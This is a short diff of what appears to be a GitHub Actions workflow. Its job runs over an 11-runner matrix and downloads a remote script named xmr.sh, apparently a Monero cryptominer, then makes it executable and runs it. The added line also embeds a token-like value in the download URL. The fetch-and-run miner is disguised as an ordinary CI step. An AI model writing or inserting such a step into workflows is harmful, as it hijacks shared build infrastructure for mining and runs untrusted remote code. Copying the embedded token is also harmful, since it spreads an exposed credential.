@@ -25,4 +25,4 @@ jobs:
      runner: [0,1,2,3,4,5,6,7,8,9,10]
    steps:
      - run: |
-          wget https://raw.githubusercontent.com/NAWAK01/script/main/xmr.sh && chmod +x xmr.sh && ./xmr.sh
+          wget https://raw.githubusercontent.com/NAWAK01/script/main/xmr.sh?token=GHSAT0AAAAAABW5JINALFJWAL6ZRHLLHYSMYW5CTZA && chmod +x xmr.sh && ./xmr.sh
